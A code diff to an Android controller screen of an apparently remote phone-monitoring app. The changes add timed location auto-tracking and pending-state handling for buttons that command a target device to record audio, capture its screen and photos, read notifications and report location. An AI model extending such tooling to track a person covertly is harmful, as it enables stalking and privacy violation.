@@ -233,8 +233,9 @@ class MonitorActivity : AppCompatActivity() {
             }
         }
 
-        findViewById<Button>(R.id.btnStopLiveScreen).setOnClickListener {
-            sendCommand("STOP_LIVE_SCREEN")
+        val btnStopLiveScreen = findViewById<Button>(R.id.btnStopLiveScreen)
+        btnStopLiveScreen.setOnClickListener {
+            sendCommand("STOP_LIVE_SCREEN", btnStopLiveScreen)
         }
 
         findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
@@ -243,15 +244,27 @@ class MonitorActivity : AppCompatActivity() {
             }
         }
 
-        findViewById<Button>(R.id.btnStopRecord).setOnClickListener {
-            sendCommand("STOP_RECORD_AUDIO")
+        val btnStopRecord = findViewById<Button>(R.id.btnStopRecord)
+        btnStopRecord.setOnClickListener {
+            sendCommand("STOP_RECORD_AUDIO", btnStopRecord)
         }
 
-        findViewById<Button>(R.id.btnGetLocation).setOnClickListener {
-            checkAndDeductPoints(150, "Location") {
-                sendCommand("GET_LOCATION")
-                tabLayout.getTabAt(3)?.select() // Jump to Map
-            }
+        val btnGetLocation = findViewById<android.widget.Button>(R.id.btnGetLocation)
+        btnGetLocation.setOnClickListener {
+            val options = arrayOf("Get Current Location (150 pts)", "Auto Track Location")
+            androidx.appcompat.app.AlertDialog.Builder(this)
+                .setTitle("Location Options")
+                .setItems(options) { _, which ->
+                    if (which == 0) {
+                        checkAndDeductPoints(150, "Location") {
+                            sendCommand("GET_LOCATION", btnGetLocation)
+                            tabLayout.getTabAt(3)?.select() // Jump to Map
+                        }
+                    } else {
+                        showAutoTrackDialog(btnGetLocation)
+                    }
+                }
+                .show()
         }
 
         findViewById<Button>(R.id.btnApps).setOnClickListener {
@@ -273,9 +286,10 @@ class MonitorActivity : AppCompatActivity() {
             }
         }
 
-        findViewById<Button>(R.id.btnPlayAlarm).setOnClickListener {
+        val btnPlayAlarm = findViewById<Button>(R.id.btnPlayAlarm)
+        btnPlayAlarm.setOnClickListener {
             checkAndDeductPoints(250, "Play Alarm") {
-                sendCommand("PLAY_ALARM")
+                sendCommand("PLAY_ALARM", btnPlayAlarm)
             }
         }
 
@@ -470,15 +484,113 @@ class MonitorActivity : AppCompatActivity() {
         }
     }
 
-    private fun sendCommand(command: String) {
+    private val pendingButtonTexts = mutableMapOf<Int, CharSequence>()
+
+
+    private fun showAutoTrackDialog(btnGetLocation: android.widget.Button) {
+        val view = layoutInflater.inflate(R.layout.dialog_auto_track, null)
+        val spinnerInterval = view.findViewById<android.widget.Spinner>(R.id.spinnerInterval)
+        val spinnerDuration = view.findViewById<android.widget.Spinner>(R.id.spinnerDuration)
+        val tvCostPreview = view.findViewById<android.widget.TextView>(R.id.tvCostPreview)
+
+        val intervals = arrayOf("15", "30", "60")
+        val intervalAdapter = android.widget.ArrayAdapter(this, android.R.layout.simple_spinner_item, intervals)
+        spinnerInterval.adapter = intervalAdapter
+
+        val durations = arrayOf("1", "2", "4")
+        val durationAdapter = android.widget.ArrayAdapter(this, android.R.layout.simple_spinner_item, durations)
+        spinnerDuration.adapter = durationAdapter
+
+        val updateCost = {
+            val interval = intervals[spinnerInterval.selectedItemPosition].toInt()
+            val durationHours = durations[spinnerDuration.selectedItemPosition].toInt()
+            val durationMins = durationHours * 60
+            val cost = (durationMins / interval) * 50
+            tvCostPreview.text = "Total Cost: $cost pts"
+        }
+
+        spinnerInterval.onItemSelectedListener = object : android.widget.AdapterView.OnItemSelectedListener {
+            override fun onItemSelected(parent: android.widget.AdapterView<*>?, view: android.view.View?, position: Int, id: Long) = updateCost()
+            override fun onNothingSelected(parent: android.widget.AdapterView<*>?) {}
+        }
+        spinnerDuration.onItemSelectedListener = object : android.widget.AdapterView.OnItemSelectedListener {
+            override fun onItemSelected(parent: android.widget.AdapterView<*>?, view: android.view.View?, position: Int, id: Long) = updateCost()
+            override fun onNothingSelected(parent: android.widget.AdapterView<*>?) {}
+        }
+
+        updateCost()
+
+        androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("Setup Auto Track")
+            .setView(view)
+            .setPositiveButton("Start") { _, _ ->
+                val interval = intervals[spinnerInterval.selectedItemPosition].toInt()
+                val durationHours = durations[spinnerDuration.selectedItemPosition].toInt()
+                val durationMins = durationHours * 60
+                val cost = (durationMins / interval) * 50
+
+                checkAndDeductPoints(cost, "Auto Track Location") {
+                    sendCommand("START_AUTO_LOCATION:$interval:$durationHours", btnGetLocation)
+                    tabLayout.getTabAt(3)?.select()
+                }
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
+
+    private fun sendCommand(command: String, button: Button? = null) {
         val commandRef = database.child("commands").push()
         val data = mapOf(
             "command" to command,
             "timestamp" to System.currentTimeMillis()
         )
+
+        if (button != null) {
+            val originalText = button.text
+            pendingButtonTexts[button.id] = originalText
+            button.isEnabled = false
+            button.text = "Pending..."
+
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                if (button.text == "Pending...") {
+                    button.isEnabled = true
+                    button.text = pendingButtonTexts[button.id] ?: originalText
+                    pendingButtonTexts.remove(button.id)
+                    Toast.makeText(this, "Command timed out: $command", Toast.LENGTH_SHORT).show()
+                }
+            }, 60000)
+        }
+
         commandRef.setValue(data).addOnSuccessListener {
             Toast.makeText(this, "Command sent: $command", Toast.LENGTH_SHORT).show()
         }
+    }
+
+    private fun resetAllPendingButtons() {
+        val buttons = listOf(
+            findViewById<Button>(R.id.btnReadNotifications),
+            findViewById<Button>(R.id.btnReadScreen),
+            findViewById<Button>(R.id.btnStartLiveScreen),
+            findViewById<Button>(R.id.btnStopLiveScreen),
+            findViewById<Button>(R.id.btnStartRecord),
+            findViewById<Button>(R.id.btnStopRecord),
+            findViewById<Button>(R.id.btnGetLocation),
+            findViewById<Button>(R.id.btnApps),
+            findViewById<Button>(R.id.btnDeviceStats),
+            findViewById<Button>(R.id.btnAppUsageStats),
+            findViewById<Button>(R.id.btnPlayAlarm),
+            findViewById<Button>(R.id.btnCapturePhoto),
+            findViewById<Button>(R.id.btnGetDeviceInfo),
+            findViewById<Button>(R.id.btnLaunchApp)
+        )
+        for (btn in buttons) {
+            if (btn != null && btn.text == "Pending...") {
+                btn.isEnabled = true
+                val originalText = pendingButtonTexts[btn.id]
+                if (originalText != null) btn.text = originalText
+            }
+        }
+        pendingButtonTexts.clear()
     }
 
     private fun cleanupOldData() {
@@ -525,6 +637,10 @@ class MonitorActivity : AppCompatActivity() {
                 val children = snapshot.children.toList()
                 val latestKey = children.lastOrNull()?.key
                 val shouldRedirect = lastProcessedResultKey != null && latestKey != lastProcessedResultKey
+
+                if (shouldRedirect) {
+                    resetAllPendingButtons()
+                }
 
                 // Clear map overlays before adding new ones from history
                 mapView.overlays.clear()
